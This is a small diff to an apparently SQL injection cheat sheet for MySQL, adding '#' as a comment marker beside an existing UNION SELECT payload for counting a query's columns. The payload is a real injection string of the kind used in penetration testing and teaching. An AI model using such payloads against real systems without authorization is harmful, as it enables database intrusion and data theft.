@@ -1,5 +1,8 @@
 ## MySQL
 
+- Comment
+  - `#`
+
 - Extract number column
 
   - `'union select 1,2,3#`
